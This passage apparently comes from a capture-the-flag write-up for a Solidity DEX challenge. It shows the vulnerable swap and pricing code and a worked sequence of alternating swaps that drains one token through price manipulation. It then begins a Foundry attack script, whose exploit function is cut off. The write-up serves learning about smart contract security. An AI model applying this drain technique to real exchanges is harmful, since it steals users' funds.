</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getSwapPrice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span>amount </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">/</span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">SwappableToken</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">SwappableToken</span><span class="token" style="color:#d4d4d4">(</span><span>token2</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> token</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> account</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>token</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>account</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">SwappableToken</span><span> </span><span class="token" style="color:#569CD6">is</span><span> ERC20 </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">private</span><span> _dex</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> dexInstance</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> name</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> symbol</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#dcdcaa">ERC20</span><span class="token" style="color:#d4d4d4">(</span><span>name</span><span class="token" style="color:#d4d4d4">,</span><span> symbol</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_mint</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        _dex </span><span class="token" style="color:#d4d4d4">=</span><span> dexInstance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> owner</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>owner </span><span class="token" style="color:#d4d4d4">!=</span><span> _dex</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;InvalidApprover&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    super</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">_approve</span><span class="token" style="color:#d4d4d4">(</span><span>owner</span><span class="token" style="color:#d4d4d4">,</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>The goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.</p>
<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.</p>
<p><strong>Explanation</strong>:</p>
<ol>
<li>You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.</li>
<li>There is a <code>swap()</code> function inside Dex contract which swaps one token for another. Inside <code>swap()</code> intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.</li>
<li>Observe that the <code>getSwapPrice()</code> is used to get the amount of tokens to be transferred to the <code>to</code> address.</li>
</ol>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> token1 </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> to </span><span class="token" style="color:#d4d4d4">==</span><span> token2</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">||</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> token2 </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> to </span><span class="token" style="color:#d4d4d4">==</span><span> token   </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Invalid tokens&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> amount</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not enough to swap&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint</span><span> swapAmount </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">getSwapPrice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> swapAmount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> swapAmount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getSwapPrice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span>amount </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">/</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p>4.The <code>amount</code> is the amount of the tokens that added to the balance of <code>Dex</code> contract.</p>
<p>5.<code>swapAmount</code> is the amount of tokens that goes to the <code>to</code> address from the balance of the <code>Dex</code> contract.</p>
<p>6.When I started calculation for <code>swapAmount</code>, I have observed that swapping between two tokens slightly increases the balance of the <code>to</code> address.</p>
<pre><code>
For the first swap:
swap(Token1, Token2, 10)
swapAmount = (10 * 100)/100 = 10 + balance of player in token2 is 10
		   =&gt; 20

For the second swap:
swap(Token2, Token1, 20)
swapAmount = (20*110)/90 = 24 + 0 =&gt;24

For the third swap:
swap(Token1, Token2, 24)
swapAmount = (24*110)/86 = 30 + 0 =&gt; 30

For the fourth swap:
swap(Token2, Token1, 30)
swapAmount = (30*110)/80 = 41 + 0 =&gt; 41

For the fifth swap:
swap(Token1, Token2, 41)
swapAmount = (41*110)/69 = 65 + 0 =&gt; 65

If we swap(Token2, Token1, 65) then
swapAmount = (65*110)/45 = 158 but the transaction would fail because the Dex
does not have enough balance to execute the transaction.

We need to calculate the amountOfToken2ToSell in order to get back 110 Token1

110 Token1 = amountOfToken2ToSell * DexBalanceOfToken1/DexBalanceOfToken2
110 = amountOfToken2ToSell * 110/45
amountOfToken2ToSell = 45

If we swap token2 with amount 45 then the balanceOf Token1 in Dex is 0.


Swap         |             Dex            |       User
             |      Token1  | Token2      |  Token1 | Token2
-----------------------------------------------------------
 Before Swap |     100      | 100         |  10     |  10
 First Swap  |     110      | 90          |  0      |  20
 Second Swap |     86       | 110         |  24     |  0
 Third Swap  |     110      | 80          |  0      |  30
 Fourth Swap |     69       | 110         |  41     |  0
 Fifth Swap  |     110      | 45          |  0      |  65

 Sixth Swap  |     0        | 90          |  110    |  20

</code></pre>
<p><strong>Level22Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>Dex</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level22.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level22Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Dex </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Dex</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x7f2041D22Bf8D693507A9347785C182BBB73285d</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span> token1 </span><span class="token" style="color:#d4d4d4">=</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> token2 </span><span class="token" style="color:#d4d4d4">=</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token2</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        Attack attack </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>attack</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> myAddress </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envAddress</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY_ADDRESS&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        attack</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span>myAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;DEX balance in TOKEN1 is &quot;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>            instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Dex </span><span class="token" style="color:#569CD6">public</span><span> dex </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Dex</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x7f2041D22Bf8D693507A9347785C182BBB73285d</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> token1 </span><span class="token" style="color:#d4d4d4">=</span><span> dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> token2 </span><span class="token" style="color:#d4d4d4">=</span><span> dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token2</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> myAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>myAddress</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>token2</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>myAddress</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
